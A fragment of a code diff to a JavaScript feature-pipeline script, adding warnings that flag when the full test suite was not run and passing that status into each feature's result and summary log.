+    if (fullSuiteStatus !== 'ran') {
+      log(`${logPrefix}⚠ FULL SUITE NOT RUN (${fullSuiteStatus}) — ${FULL_SUITE_REASONS[fullSuiteStatus]}; only the files this run touched were tested.`)
+    }
 
     const approved = finalVerdict.status === 'approved'
 
@@ -1966,7 +2345,7 @@ async function runOneFeature(task, ctx) {
     const { recordMisplaced, recordStatus } = await phaseRecord(approved, plan, finalVerdict, securityReport, task, ctx, WORKTREE_BLOCK, models, logStage, logPrefix, downgraded)
 
     // Phase 6: Shape result
-    return shapeResult(approved, plan, researchReport, securityReport, finalVerdict, surface, models, iteration, task, ctx, recordMisplaced, recordStatus)
+    return shapeResult(approved, plan, researchReport, securityReport, finalVerdict, surface, models, iteration, task, ctx, recordMisplaced, recordStatus, fullSuiteStatus, scopedTests?.mode || 'full')
   } catch (err) {
     // A thrown error inside one feature must not abort siblings running under
     // parallel() — return a failure shape instead of letting it propagate.
@@ -2051,6 +2430,10 @@ if (tasksList) {
     // the run succeeded, and the ⚠ line inside phaseRecord went to the log of
     // a phase the operator may never scroll back to.
     if (f.record_status === 'failed') log(`  [${f.label}] ⚠ Recorder failed — review report and architecture doc were not written`)
+    // Same reasoning as the record_status line above: the ⚠ inside
+    // runOneFeature went to a per-feature log the operator may never scroll
+    // back to, and this one qualifies the ✓ printed two lines up.
+    if (f.full_suite_status && f.full_suite_status !== 'ran') log(`  [${f.label}] ⚠ FULL SUITE NOT RUN (${f.full_suite_status}) — only the files this run touched were tested`)
   })
   if (budget.total) log(`Budget remaining: ${Math.round(budget.remaining() / 1000)}k`)
 
